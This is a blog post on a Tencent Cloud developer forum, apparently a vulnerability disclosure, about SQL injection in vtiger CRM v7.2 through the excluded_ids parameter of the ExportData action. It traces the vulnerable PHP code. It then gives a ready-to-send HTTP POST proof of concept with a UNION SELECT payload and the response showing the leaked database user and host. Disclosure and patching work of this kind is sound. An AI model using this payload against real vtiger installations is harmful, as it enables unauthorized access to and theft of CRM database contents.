=== Content from cloud.tencent.com_08154dca_20250119_111452.html ===
[Deen\_](/developer/user/2359520)
## SQL Injection vulnerabilities in the latest vtiger crm (v7.2)

原创关注作者前往小程序，Get*更优*阅读体验！立即前往[*腾讯云*](/?from=20060&from_column=20060)[*开发者社区*](/developer)[文档](/document/product?from=20702&from_column=20702)[建议反馈](/voc/?from=20703&from_column=20703)[控制台](https://console.cloud.tencent.com?from=20063&from_column=20063)登录/注册[首页](/developer)学习活动专区工具[TVP](/tvp?from=20154&from_column=20154)[腾讯云架构师技术同盟](/developer/program/tm)文章/答案/技术大牛搜索搜索关闭发布[首页](/developer)学习活动专区工具[TVP](/tvp?from=20154&from_column=20154)[腾讯云架构师技术同盟](/developer/program/tm)[返回腾讯云官网](/?from=20060&from_column=20060)Deen\_[首页](/developer)学习活动专区工具[TVP](/tvp?from=20154&from_column=20154)[腾讯云架构师技术同盟](/developer/program/tm)[返回腾讯云官网](/?from=20060&from_column=20060)[社区首页](/developer) >[专栏](/developer/column) >SQL Injection vulnerabilities in the latest vtiger crm (v7.2)
# SQL Injection vulnerabilities in the latest vtiger crm (v7.2)

原创![作者头像](https://ask.qcloudimg.com/http-save/yehe-2359520/reqxsi7j76.jpeg)Deen\_关注修改于 2020-04-10 10:52:34修改于 2020-04-10 10:52:341.4K0举报文章被收录于专栏：Deen的代金券日记
### 0x01 Get source code

We can get the source code from [https://www.vtiger.com/open-source-crm/download-open-source/](/developer/tools/blog-entry?target=https%3A%2F%2Fwww.vtiger.com%2Fopen-source-crm%2Fdownload-open-source%2F&objectId=1612208&objectType=1&isNewArticle=undefined)

### 0x02 Sqli vulnerabilities

modules/Vtiger/actions/ExportData.php , ExportData function , $db->pquery to execute the sql.

![image.png](https://ask.qcloudimg.com/developer-images/article/2359520/dcw2emvi9m.png)image.png代码语言：txt复制
```
        $query = $this->getExportQuery($request);
		$result = $db->pquery($query, array());
```

follow the getExportQuery function, line 200,

![image.png](https://ask.qcloudimg.com/developer-images/article/2359520/eikgm21xt3.png)image.png代码语言：txt复制
```
$query .= ' AND '.$baseTable.'.'.$baseTableColumnId.' NOT IN ('.implode(',',$request->get('excluded_ids')).')';

```

we can control the $request->get('excluded\_ids')) variable to sql injecttion.

### 0x03 Trigger vulnerabilities

modules/Calendar/actions/ExportData.php, the function ExportData.

代码语言：txt复制
```
public function ExportData(Vtiger_Request $request) {
		$this->moduleCall = true;
		if ($request->get('type') == 'csv') {
			parent::ExportData($request);
			return;
		}
```

call the parent's function ExportData to trigger the sql injection.

**poc:**

![image.png](https://ask.qcloudimg.com/developer-images/article/2359520/v2al700a3n.png)image.png代码语言：txt复制
```
POST http://localhost/index.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Content-Length: 565
Referer: http://localhost/index.php?module=Calendar&view=List
Cookie: PHPSESSID=3us5esfl1trl1l2fvca8qr6nt0
Connection: close
Upgrade-Insecure-Requests: 1

__vtrftk=sid%3A4396fb92c83fa09039b33490416bd5d2f259ec33%2C1586430021&module=Calendar&source_module=Calendar&action=ExportData&viewname=11119&selected_ids=&excluded_ids=&page=1&search_key=&operator=&search_value=&search_params=%5B%5D&orderby=&sortorder=&tag_params=%5B%5D&type=csv&mode=ExportSelectedRecords&excluded_ids[0]=1) union select '123','1','2020-04-09','10:17:00','10:22:00',DATE('2020-04-09'),'2020-04-01','10:17:00','','Planned','Planned','Planned2','Planned','','0','2020-04-09 10:17:06','2020-04-09 10:17:06','Call','Public','','0','1',user(),'','2'%23
```

reponse

代码语言：txt复制
```
"123","admin","04-09-2020 03:22:00","03:22:00","03:17:00","04-01-2020 03:17:00","","Planned","","0","04-09-2020 03:17:06","04-09-2020 03:17:06","Call","Public","","0","admin","root@10.16.100.69","",""
```

原创声明：本文系作者授权腾讯云开发者社区发表，未经许可，不得转载。

如有侵权，请联系 cloudcommunity@tencent.com 删除。

[安全漏洞](/developer/tag/10811)

原创声明：本文系作者授权腾讯云开发者社区发表，未经许可，不得转载。

如有侵权，请联系 cloudcommunity@tencent.com 删除。

[安全漏洞](/developer/tag/10811)评论登录后参与评论0 条评论热度最新登录 后参与评论推荐阅读LV.[文章0](/developer/user/undefined/articles)[获赞0](/developer/user/undefined)目录

* 0x01 Get source code
* 0x02 Sqli vulnerabilities
* 0x03 Trigger vulnerabilities
领券

* ### 社区

  + [技术文章](/developer/column)
  + [技术问答](/developer/ask)
  + [技术沙龙](/developer/salon)
  + [技术视频](/developer/video)
  + [学习中心](/developer/learning)
  + [技术百科](/developer/techpedia)
  + [技术专区](/developer/zone/list)
* ### 活动

  + [自媒体同步曝光计划](/developer/support-plan)
  + [邀请作者入驻](/developer/support-plan-invitation)
  + [自荐上首页](/developer/article/1535830)
  + [技术竞赛](/developer/competition)
* ### 资源

  + [技术周刊](/developer/specials)
  + [社区标签](/developer/tags)
  + [开发者手册](/developer/devdocs)
  + [开发者实验室](/lab?from=20064&from_column=20064)
* ### 关于

  + [社区规范](/developer/article/1006434)
  + [免责声明](/developer/article/1006435)
  + 联系我们
  + [友情链接](/developer/friendlink)
### 腾讯云开发者

![扫码关注腾讯云开发者](https://qcloudimg.tencent-cloud.cn/raw/a8907230cd5be483497c7e90b061b861.png?imageView2/2/w/76)

扫码关注腾讯云开发者

领取腾讯云代金券

### 热门产品

* [域名注册](https://dnspod.cloud.tencent.com?from=20064&from_column=20064)
* [云服务器](/product/cvm?from=20064&from_column=20064)
* [区块链服务](/product/tbaas?from=20064&from_column=20064)
* [消息队列](/product/mq?from=20064&from_column=20064)
* [网络加速](/product/dsa?from=20064&from_column=20064)
* [云数据库](/product/tencentdb-catalog?from=20064&from_column=20064)
* [域名解析](/product/cns?from=20064&from_column=20064)
* [云存储](/product/cos?from=20064&from_column=20064)
* [视频直播](/product/css?from=20064&from_column=20064)
### 热门推荐

* [人脸识别](/product/facerecognition?from=20064&from_column=20064)
* [腾讯会议](/product/tm?from=20064&from_column=20064)
* [企业云](/act/pro/enterprise2019?from=20064&from_column=20064)
* [CDN加速](/product/cdn-scd?from=20064&from_column=20064)
* [视频通话](/product/trtc?from=20064&from_column=20064)
* [图像分析](/product/tiia?from=20064&from_column=20064)
* [MySQL 数据库](/product/cdb?from=20064&from_column=20064)
* [SSL 证书](/product/symantecssl?from=20064&from_column=20064)
* [语音识别](/product/asr?from=20064&from_column=20064)
### 更多推荐

* [数据安全](/solution/data_protection?from=20064&from_column=20064)
* [负载均衡](/product/clb?from=20064&from_column=20064)
* [短信](/product/sms?from=20064&from_column=20064)
* [文字识别](/product/ocr?from=20064&from_column=20064)
* [云点播](/product/vod?from=20064&from_column=20064)
* [商标注册](https://tm.cloud.tencent.com?from=20064&from_column=20064)
* [小程序开发](/solution/la?from=20064&from_column=20064)
* [网站监控](/product/cat?from=20064&from_column=20064)
* [数据迁移](/product/cdm?from=20064&from_column=20064)

Copyright © 2013 - 2025 Tencent Cloud. All Rights Reserved. 腾讯云 版权所有

深圳市腾讯计算机系统有限公司 ICP备案/许可证号：[粤B2-20090059](https://beian.miit.gov.cn/#/Integrated/index)[深公网安备号 44030502008569](https://www.beian.gov.cn/portal/index.do)

腾讯云计算（北京）有限责任公司 京ICP证150476号 |  [京ICP备11018762号](https://beian.miit.gov.cn/#/Integrated/index) | [京公网安备号11010802020287](https://www.beian.gov.cn/portal/index.do)

[问题归档](/developer/ask/archives.html)[专栏文章](/developer/column/archives.html)[快讯文章归档](/developer/news/archives.html)[关键词归档](/developer/information/all.html)[开发者手册归档](/developer/devdocs/archives.html)[开发者手册 Section 归档](/developer/devdocs/sections_p1.html)

Copyright © 2013 - 2025 Tencent Cloud.

All Rights Reserved. 腾讯云 版权所有

登录 后参与评论000推荐
